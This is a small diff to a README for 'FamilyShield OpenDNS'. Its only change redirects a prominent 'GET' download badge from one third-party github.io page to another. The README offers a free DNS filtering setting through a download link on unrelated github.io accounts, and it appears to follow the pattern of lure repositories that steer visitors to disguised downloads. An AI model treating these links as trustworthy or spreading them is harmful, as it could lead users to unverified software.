@@ -1,6 +1,6 @@
 # FamilyShield OpenDNS - DNS-Based Family Web Filtering
 
-[![GET FamilyShield OpenDNS](https://img.shields.io/badge/GET%20%E2%80%94%20FamilyShield%20OpenDNS-0078D6?style=for-the-badge&logoColor=white)](https://israelzunigaaqqx.github.io/.github/FamilyShield-OpenDNS)
+[![GET FamilyShield OpenDNS](https://img.shields.io/badge/GET%20%E2%80%94%20FamilyShield%20OpenDNS-0078D6?style=for-the-badge&logoColor=white)](https://family-shield-opendns.github.io/.github/)
 
 ## FamilyShield OpenDNS Service Snapshot
 
